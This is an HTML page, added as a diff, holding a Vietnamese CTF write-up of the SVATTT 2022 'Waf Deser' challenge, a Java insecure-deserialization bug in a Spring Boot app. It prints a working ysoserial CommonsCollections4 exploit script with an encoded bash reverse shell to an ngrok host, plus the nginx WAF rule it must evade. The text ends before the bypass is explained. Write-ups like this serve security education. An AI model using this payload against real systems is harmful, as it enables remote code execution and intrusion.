@@ -1,0 +1,514 @@
+<!DOCTYPE html>
+<html lang="vi-vn">
+<head>
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title> SVATTT 2022 Ctf Writeup - Waf Deser | devme4f blogs</title>
+  <link rel = 'canonical' href = 'https://devme4f.github.io/posts/2022/waf-deser/'>
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="robots" content="all,follow">
+  <meta name="googlebot" content="index,follow,snippet,archive">
+  <meta property="og:title" content="SVATTT 2022 Ctf Writeup - Waf Deser" />
+<meta property="og:description" content="Preface Writeup bài web jeopardy java Waf Deser thuộc giải SVATTT 2022 vòng sơ khảo, đây cũng là năm đầu tiên mình may mắn nằm trong team của trường được tham dự giải này, java lúc này cũng khá xa lạ đối với mình nhưng may mắn team mình vẫn cố gắng và solved được vào phút chót - nhờ đó có giải ẵm về hihi!
+Source-code: https://drive.google.com/file/d/1wxbVU11RIqD_RTtAcrIQGB82ihAxX06q/view?usp=sharing
+Review Source Code Sau khi giải nén mình được 1 file jar &#43; nginx." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://devme4f.github.io/posts/2022/waf-deser/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-10-17T10:40:32+07:00" />
+<meta property="article:modified_time" content="2022-10-17T10:40:32+07:00" />
+
+  <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="SVATTT 2022 Ctf Writeup - Waf Deser"/>
+<meta name="twitter:description" content="Preface Writeup bài web jeopardy java Waf Deser thuộc giải SVATTT 2022 vòng sơ khảo, đây cũng là năm đầu tiên mình may mắn nằm trong team của trường được tham dự giải này, java lúc này cũng khá xa lạ đối với mình nhưng may mắn team mình vẫn cố gắng và solved được vào phút chót - nhờ đó có giải ẵm về hihi!
+Source-code: https://drive.google.com/file/d/1wxbVU11RIqD_RTtAcrIQGB82ihAxX06q/view?usp=sharing
+Review Source Code Sau khi giải nén mình được 1 file jar &#43; nginx."/>
+
+  
+  
+    
+  
+  
+  <link rel="stylesheet" href="https://devme4f.github.io/css/styles.a7dd5af4c7ef9f93fb31b1147bb343d14667fd6cdafa7ae17de8d923a2f6a282b9db99fd91500efb76d5de5a5603d29fb153733d9bfac95b534e595d0ab745a7.css" integrity="sha512-p91a9Mfvn5P7MbEUe7ND0UZn/Wza&#43;nrhfejZI6L2ooK525n9kVAO&#43;3bV3lpWA9KfsVNzPZv6yVtTTlldCrdFpw=="> 
+
+  
+  
+  
+    <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+  
+
+  
+<link rel="icon" type="image/png" href="https://devme4f.github.io/images/favicon.ico" />
+
+  
+  
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+  <div class="content index py4">
+
+  <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+        <li><a href="/">Home</a></li>
+         
+        <li><a href="/posts">Archives</a></li>
+         
+        <li><a href="/tags">Tags</a></li>
+         
+        <li><a href="/about">About</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li>
+          <a class="icon" href="https://devme4f.github.io/posts/2023/manageengineam_cve-2020-15394/" aria-label="Next">
+            <i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i>
+          </a>
+        </li>
+        
+        <li>
+          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
+            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
+          </a>
+        </li>
+        <li>
+          <a class="icon" href="#" aria-label="Share">
+            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
+          </a>
+        </li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fdevme4f.github.io%2fposts%2f2022%2fwaf-deser%2f" aria-label="Facebook">
+      <i class="fab fa-facebook " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2022%2fwaf-deser%2f&text=SVATTT%202022%20Ctf%20Writeup%20-%20Waf%20Deser" aria-label="Twitter">
+      <i class="fab fa-twitter " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2022%2fwaf-deser%2f&title=SVATTT%202022%20Ctf%20Writeup%20-%20Waf%20Deser" aria-label="Linkedin">
+      <i class="fab fa-linkedin " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2022%2fwaf-deser%2f&is_video=false&description=SVATTT%202022%20Ctf%20Writeup%20-%20Waf%20Deser" aria-label="Pinterest">
+      <i class="fab fa-pinterest " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=SVATTT%202022%20Ctf%20Writeup%20-%20Waf%20Deser&body=Check out this article: https%3a%2f%2fdevme4f.github.io%2fposts%2f2022%2fwaf-deser%2f" aria-label="Email">
+      <i class="fas fa-envelope " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2022%2fwaf-deser%2f&title=SVATTT%202022%20Ctf%20Writeup%20-%20Waf%20Deser" aria-label="Pocket">
+      <i class="fab fa-get-pocket " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2022%2fwaf-deser%2f&title=SVATTT%202022%20Ctf%20Writeup%20-%20Waf%20Deser" aria-label="reddit">
+      <i class="fab fa-reddit " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2022%2fwaf-deser%2f&name=SVATTT%202022%20Ctf%20Writeup%20-%20Waf%20Deser&description=Preface%20Writeup%20b%c3%a0i%20web%20jeopardy%20java%20Waf%20Deser%20thu%e1%bb%99c%20gi%e1%ba%a3i%20SVATTT%202022%20v%c3%b2ng%20s%c6%a1%20kh%e1%ba%a3o%2c%20%c4%91%c3%a2y%20c%c5%a9ng%20l%c3%a0%20n%c4%83m%20%c4%91%e1%ba%a7u%20ti%c3%aan%20m%c3%acnh%20may%20m%e1%ba%afn%20n%e1%ba%b1m%20trong%20team%20c%e1%bb%a7a%20tr%c6%b0%e1%bb%9dng%20%c4%91%c6%b0%e1%bb%a3c%20tham%20d%e1%bb%b1%20gi%e1%ba%a3i%20n%c3%a0y%2c%20java%20l%c3%bac%20n%c3%a0y%20c%c5%a9ng%20kh%c3%a1%20xa%20l%e1%ba%a1%20%c4%91%e1%bb%91i%20v%e1%bb%9bi%20m%c3%acnh%20nh%c6%b0ng%20may%20m%e1%ba%afn%20team%20m%c3%acnh%20v%e1%ba%abn%20c%e1%bb%91%20g%e1%ba%afng%20v%c3%a0%20solved%20%c4%91%c6%b0%e1%bb%a3c%20v%c3%a0o%20ph%c3%bat%20ch%c3%b3t%20-%20nh%e1%bb%9d%20%c4%91%c3%b3%20c%c3%b3%20gi%e1%ba%a3i%20%e1%ba%b5m%20v%e1%bb%81%20hihi%21%0aSource-code%3a%20https%3a%2f%2fdrive.google.com%2ffile%2fd%2f1wxbVU11RIqD_RTtAcrIQGB82ihAxX06q%2fview%3fusp%3dsharing%0aReview%20Source%20Code%20Sau%20khi%20gi%e1%ba%a3i%20n%c3%a9n%20m%c3%acnh%20%c4%91%c6%b0%e1%bb%a3c%201%20file%20jar%20%2b%20nginx." aria-label="Tumblr">
+      <i class="fab fa-tumblr " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fdevme4f.github.io%2fposts%2f2022%2fwaf-deser%2f&t=SVATTT%202022%20Ctf%20Writeup%20-%20Waf%20Deser" aria-label="Hacker News">
+      <i class="fab fa-hacker-news " aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+    
+    <div id="toc">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#preface">Preface</a></li>
+    <li><a href="#review-source-code">Review Source Code</a></li>
+    <li><a href="#exploit">Exploit</a></li>
+    <li><a href="#bypass">Bypass</a></li>
+  </ul>
+</nav>
+    </div>
+    
+  </span>
+</div>
+
+
+  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+    <header>
+      <h1 class="posttitle" itemprop="name headline">
+        SVATTT 2022 Ctf Writeup - Waf Deser
+      </h1>
+      <div class="meta">
+        
+        <div class="postdate">
+          
+          <time datetime="2022-10-17 10:40:32 &#43;0700 &#43;07" itemprop="datePublished">2022-10-17</time>
+          
+        </div>
+        
+        
+        
+        
+        <div class="article-tag">
+            <i class="fas fa-tag"></i>
+            
+            
+            <a class="tag-link" href="/tags/ctf" rel="tag">ctf</a>
+            
+             ,  
+            <a class="tag-link" href="/tags/deser" rel="tag">deser</a>
+            
+        </div>
+        
+      </div>
+    </header>
+
+  
+    
+    <div class="content" itemprop="articleBody">
+      <p><img src="/images/2022/waf-deser/theme.png" alt="theme"></p>
+<h2 id="preface">Preface</h2>
+<p>Writeup bài web jeopardy java <code>Waf Deser</code> thuộc giải SVATTT 2022 vòng sơ khảo, đây cũng là năm đầu tiên mình may mắn nằm trong team của trường được tham dự giải này, java lúc này cũng khá xa lạ đối với mình nhưng may mắn team mình vẫn cố gắng và solved được vào phút chót - nhờ đó có giải ẵm về hihi!</p>
+<p><strong>Source-code</strong>: <a href="https://drive.google.com/file/d/1wxbVU11RIqD_RTtAcrIQGB82ihAxX06q/view?usp=sharing">https://drive.google.com/file/d/1wxbVU11RIqD_RTtAcrIQGB82ihAxX06q/view?usp=sharing</a></p>
+<h2 id="review-source-code">Review Source Code</h2>
+<p>Sau khi giải nén mình được 1 file jar + nginx.conf + docker file.</p>
+<p>Đọc file Docker thì có thể thấy mình cần RCE và thực thi file <code>/readflag</code> thì mới có thể đọc flag, file jar thì chạy jdk 11. Server này cũng nằm sau 1 nginx proxy firewall với các rule check, mình sẽ phân tính kĩ hơn ở sau.</p>
+<p>Mở Intellij lên thư mục vừa giải nén và add file <code>waf-deser-0.0.1-SNAPSHOt.jar</code> as library, bằng cách này ta có thể xem được source code java mà không cần phải decompile ra.</p>
+<p><img src="/images/2022/waf-deser/add-as-library.png" alt="add-as-library"></p>
+<p>Xem qua ta có thể thấy server chạy Spring Boot và Controller chính <code>UserController</code> nằm ở package <code>vcs.example.wafdeser</code>.</p>
+<p><img src="/images/2022/waf-deser/structure.png" alt="structure"></p>
+<p><strong>Class UserController</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">UserController</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">UserController</span>() {
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@GetMapping</span>({<span style="color:#e6db74">&#34;/&#34;</span>})
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">sayHello</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> String.<span style="color:#a6e22e">format</span>(<span style="color:#e6db74">&#34;Hello ASCIS&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@RequestMapping</span>(
+</span></span><span style="display:flex;"><span>        value <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;/info/{info}&#34;</span>},
+</span></span><span style="display:flex;"><span>        method <span style="color:#f92672">=</span> {RequestMethod.<span style="color:#a6e22e">GET</span>}
+</span></span><span style="display:flex;"><span>    )
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">getUser</span>(<span style="color:#a6e22e">@PathVariable</span>(<span style="color:#e6db74">&#34;info&#34;</span>) String info, <span style="color:#a6e22e">@RequestParam</span>(name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;compress&#34;</span>,defaultValue <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;false&#34;</span>) Boolean isCompress) <span style="color:#66d9ef">throws</span> IOException {
+</span></span><span style="display:flex;"><span>        String unencodedData <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">unEncode</span>(info);
+</span></span><span style="display:flex;"><span>        String returnData <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> data <span style="color:#f92672">=</span> Base64.<span style="color:#a6e22e">getMimeDecoder</span>().<span style="color:#a6e22e">decode</span>(unencodedData);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (isCompress) {
+</span></span><span style="display:flex;"><span>            InputStream is <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ByteArrayInputStream(data);
+</span></span><span style="display:flex;"><span>            InputStream is <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> GZIPInputStream(is);
+</span></span><span style="display:flex;"><span>            ObjectInputStream ois <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectInputStream(is);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>                User user <span style="color:#f92672">=</span> (User)ois.<span style="color:#a6e22e">readObject</span>();
+</span></span><span style="display:flex;"><span>                returnData <span style="color:#f92672">=</span> user.<span style="color:#a6e22e">getName</span>();
+</span></span><span style="display:flex;"><span>                ois.<span style="color:#a6e22e">close</span>();
+</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">catch</span> (Exception var9) {
+</span></span><span style="display:flex;"><span>                returnData <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;?????&#34;</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            returnData <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> String(data, StandardCharsets.<span style="color:#a6e22e">UTF_8</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> String.<span style="color:#a6e22e">format</span>(<span style="color:#e6db74">&#34;Hello %s&#34;</span>, returnData);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> String <span style="color:#a6e22e">unEncode</span>(String s) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> s.<span style="color:#a6e22e">replaceAll</span>(<span style="color:#e6db74">&#34;-&#34;</span>, <span style="color:#e6db74">&#34;\\r\\n&#34;</span>).<span style="color:#a6e22e">replaceAll</span>(<span style="color:#e6db74">&#34;%3D&#34;</span>, <span style="color:#e6db74">&#34;=&#34;</span>).<span style="color:#a6e22e">replaceAll</span>(<span style="color:#e6db74">&#34;%2B&#34;</span>, <span style="color:#e6db74">&#34;\\+&#34;</span>).<span style="color:#a6e22e">replaceAll</span>(<span style="color:#e6db74">&#34;_&#34;</span>, <span style="color:#e6db74">&#34;/&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><strong>Phân tích</strong>: Ở route <code>/info/{info}</code> có method <code>readObject()</code> deserialize object từ user input là đáng chú ý, mình xin phân tích route này như sau:</p>
+<ol>
+<li>Data của biến <code>info</code> được lấy từ uri path ứng với: <code>/info/{info}</code> nhờ annotation @PathVariable.</li>
+<li>Biến <code>info</code> này sau đó được replace lại 1 số kí tự bằng method <code>unEncode()</code> và sẽ được base64 decode.</li>
+<li>Ở đây nếu param <code>compress</code> được set là <code>true</code> thì <code>info</code> sẽ được nạp dưới dạng là 1 object stream được nén gzip và cuối cùng sẽ được deserialize ở method <code>readObject()</code>.</li>
+</ol>
+<p>Đây rõ ràng là lỗ hổng <em>Java Insecure Deserialization</em>, để exploit thì điều tiếp theo mình cần làm là tìm là 1 sink mà có thể dẫn đển RCE khi deserialize object.</p>
+<p>Tìm đến file <code>pom.xml</code>, là file chứa thông tin để build java app thì mình thấy được server có dùng <code>Commons Collection 4</code> version 4.0. CC4 version 4.0 có <a href="https://security.snyk.io/vuln/SNYK-JAVA-ORGAPACHECOMMONS-30008">CVE</a> chứa gadget chain có thể dẫn đến RCE khi insecure deserialize obj.</p>
+<p><img src="/images/2022/waf-deser/pom.xml.png" alt="pom.xml file"></p>
+<h2 id="exploit">Exploit</h2>
+<p>Đến đây mình biết cần sử dụng gadget chain CC4 để exploit RCE, gadget này đã có sẵn trong tool ysoserial, ở Intellij mình có thể tạo 1 project Java và add <code>ysoserial.jar</code> as a library là có thể dùng được method tạo gadget có sẵn. Sau khi serialize gadget này, mình cần nén gzip lại rồi base64 encode cũng như replace lại luôn 1 số kí tự như ở server để gửi đi ở uri path mà không gây lỗi.</p>
+<p><strong>Script gen payload</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">import</span> ysoserial.payloads.CommonsCollections4;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.*;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.nio.file.Files;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.nio.file.Paths;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.Base64;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.zip.GZIPOutputStream;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Exploit</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> String <span style="color:#a6e22e">unEncode</span>(String s) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> s.<span style="color:#a6e22e">replaceAll</span>(<span style="color:#e6db74">&#34;-&#34;</span>, <span style="color:#e6db74">&#34;\\r\\n&#34;</span>).<span style="color:#a6e22e">replaceAll</span>(<span style="color:#e6db74">&#34;%3D&#34;</span>, <span style="color:#e6db74">&#34;=&#34;</span>).<span style="color:#a6e22e">replaceAll</span>(<span style="color:#e6db74">&#34;%2B&#34;</span>, <span style="color:#e6db74">&#34;\\+&#34;</span>).<span style="color:#a6e22e">replaceAll</span>(<span style="color:#e6db74">&#34;_&#34;</span>, <span style="color:#e6db74">&#34;/&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> String <span style="color:#a6e22e">encodeB</span>(String s) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> s.<span style="color:#a6e22e">replaceAll</span>(<span style="color:#e6db74">&#34;\\r\\n&#34;</span>, <span style="color:#e6db74">&#34;-&#34;</span>).<span style="color:#a6e22e">replaceAll</span>(<span style="color:#e6db74">&#34;=&#34;</span>, <span style="color:#e6db74">&#34;%3D&#34;</span>).<span style="color:#a6e22e">replaceAll</span>(<span style="color:#e6db74">&#34;\\+&#34;</span>, <span style="color:#e6db74">&#34;%2B&#34;</span>).<span style="color:#a6e22e">replaceAll</span>(<span style="color:#e6db74">&#34;/&#34;</span>, <span style="color:#e6db74">&#34;_&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">int</span> bufferSize <span style="color:#f92672">=</span> 1024;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">gZipFile</span>(String inputPath, String outputPath) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        FileInputStream fis <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> FileInputStream(inputPath);
+</span></span><span style="display:flex;"><span>        FileOutputStream fos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> FileOutputStream(outputPath);
+</span></span><span style="display:flex;"><span>        GZIPOutputStream gos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> GZIPOutputStream(fos);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> buffer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[</span>bufferSize<span style="color:#f92672">]</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>{
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">int</span> len;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">while</span>((len <span style="color:#f92672">=</span> fis.<span style="color:#a6e22e">read</span>(buffer)) <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span>1) {
+</span></span><span style="display:flex;"><span>                gos.<span style="color:#a6e22e">write</span>(buffer, 0, len);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">finally</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span>{<span style="color:#66d9ef">if</span>(fis <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>) fis.<span style="color:#a6e22e">close</span>();} <span style="color:#66d9ef">catch</span>(Exception e){}
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span>{<span style="color:#66d9ef">if</span>(gos <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>) gos.<span style="color:#a6e22e">close</span>();} <span style="color:#66d9ef">catch</span>(Exception e){}
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Serialize CommonsCollection4 RCE gadget chain từ ysoserial.</span>
+</span></span><span style="display:flex;"><span>            CommonsCollections4 cc4 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> CommonsCollections4();
+</span></span><span style="display:flex;"><span>            Object obj <span style="color:#f92672">=</span> cc4.<span style="color:#a6e22e">getObject</span>(<span style="color:#e6db74">&#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8wLnRjcC5hcC5uZ3Jvay5pby8xMzk5MiAwPiYx}|{base64,-d}|{bash,-i}&#34;</span>); <span style="color:#75715e">// command lấy reverse shell.</span>
+</span></span><span style="display:flex;"><span>            FileOutputStream fos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> FileOutputStream(<span style="color:#e6db74">&#34;cc4.txt&#34;</span>);
+</span></span><span style="display:flex;"><span>            ObjectOutputStream oos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectOutputStream(fos);
+</span></span><span style="display:flex;"><span>            oos.<span style="color:#a6e22e">writeObject</span>(obj);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Compress thành file gzip</span>
+</span></span><span style="display:flex;"><span>            gZipFile(<span style="color:#e6db74">&#34;cc4.txt&#34;</span>, <span style="color:#e6db74">&#34;cc4.txt.gz&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Lấy dữ liệu từ file gzip và thực hiện encode</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> bytes <span style="color:#f92672">=</span> Files.<span style="color:#a6e22e">readAllBytes</span>(Paths.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;cc4.txt.gz&#34;</span>));
+</span></span><span style="display:flex;"><span>            String a <span style="color:#f92672">=</span>  Base64.<span style="color:#a6e22e">getEncoder</span>().<span style="color:#a6e22e">encodeToString</span>(bytes);
+</span></span><span style="display:flex;"><span>            System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(encodeB(a));
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (Exception e) {
+</span></span><span style="display:flex;"><span>            e.<span style="color:#a6e22e">printStackTrace</span>();
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><strong>Lưu ý</strong>:</p>
+<ol>
+<li>Server(docker) không có các tool như curl, ping, nc,&hellip; nên không thể sử dụng để lấy luôn flag được, phải lấy được shell.</li>
+<li>Method <code>getObject()</code> khi tạo payload CC4 nhận arg command dưới dạng là 1 string, cái mà sẽ được nạp vào method <code>Runtime.getRuntime.exec(string)</code> để thực thi command. Mà method <a href="https://askcodes.net/coding/why-does-runtime-exec-string--work-for-some-but-not-all-commands-">exec(string) trong Java sẽ tự động split string dựa vào dấu space thành 1 string array</a> để pass như các command arguments cho nên chỗ command này mình cần escape dấu space.</li>
+<li><code>Runtime.getRuntime.exec()</code> có nhiều hạn chế hơn 1 shell bình thường nên 1 số ký tự, command không thể intepret hay escape nên ví dụ với command <code>bash -i &gt;&amp; /dev/tcp/0.tcp.ap.ngrok.io/13992 0&gt;&amp;1</code> có chứa <code>&gt;&amp;</code> thì cần được escape nên mình base64 encode luôn đoạn này và nạp vào bash.</li>
+</ol>
+<p><img src="/images/2022/waf-deser/runtime.getruntime.exec-restriction.png" alt="runtime.getruntime.exec-restriction"></p>
+<p>Đến đây nếu gửi luôn payload lên server thì sẽ bị trả về: <code> 403: Deserialization of Untrusted Data Detected. (From real WAF with &lt;3)</code> do firewall mình đã nhắc ở trên.</p>
+<h2 id="bypass">Bypass</h2>
+<p><strong>nginx.conf</strong>:</p>
+<pre tabindex="0"><code class="language-conf" data-lang="conf">server {    
+    listen 80;
+
+    large_client_header_buffers 4 3000; # Limit URI length upto 3000 bytes
+
+    location ~* H4sI {
+        return 403 &#39;Deserialization of Untrusted Data Detected. (From real WAF with &lt;3)&#39;;
+    }
+
+    location / {
+        proxy_set_header   X-Forwarded-For $remote_addr;
+        proxy_set_header   Host $http_host;
+        proxy_pass         &#34;http://web:8080&#34;;
+    }
+}
